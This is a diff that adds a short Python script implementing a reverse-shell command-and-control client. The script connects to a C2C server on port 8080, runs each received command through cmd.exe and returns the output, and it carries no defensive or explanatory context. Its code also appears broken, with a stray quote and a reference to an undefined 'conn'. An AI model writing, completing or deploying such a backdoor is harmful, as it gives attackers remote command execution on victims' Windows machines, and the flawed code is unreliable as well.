@@ -1,0 +1,30 @@
+import socket
+import os
+import subprocess
+
+c2c_server = '' # import C2C server name
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((c2c_server, 8080))
+sock.send(b'c\\r\\n')
+while 1:
+    output = ''
+    data = sock.recv(1024)
+    msg = data.decode('UTF-8')
+    print(msg)
+    try:
+        output = subprocess.check_output(['cmd.exe', f'/c {msg}']) 
+        print(output)   "
+    except subprocess.CalledProcessError as err:
+        print(err)
+    #sock.send(bytes(output, 'utf-8'))
+
+    try:
+        sock.send(output)
+    except:
+        pass
+
+    if not data:
+        pass
+        #sock.send(b'\n')
+conn.close
